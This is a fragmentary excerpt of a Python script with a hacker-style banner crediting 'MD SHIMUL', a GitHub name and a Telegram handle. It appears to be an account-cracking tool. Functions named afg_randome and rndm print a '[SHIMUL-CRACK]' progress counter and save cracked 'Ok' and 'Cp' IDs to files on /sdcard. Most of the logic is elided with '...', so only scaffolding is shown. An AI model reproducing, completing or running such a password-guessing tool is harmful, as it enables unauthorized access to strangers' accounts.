...
\033[1;97m    ##     ##    ##    ## #### ##    ##  ######\033[1;0m
\033[1;97m--------------------------------------------------
\033[1;91m Author      : MD SHIMUL
\033[1;91m GitHub      : MRSH4MUL
\033[1;91m YouTube     : NAI
\033[1;91m Telegram    : DARKCYBER404
...
def afg_randome():
	...
	print('[?] Total Ok Id Save in  /sdcard/SHIMUL-OK.txt')
	print('[?] Total Cp Id Save in  /sdcard/SHIMUL-CP.txt')
	print(47*'-')
...
def rndm(ids,mking_pass):
	try:
		global ok,loop
		sys.stdout.write('\r\r\033[1;37m [SHIMUL-CRACK] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
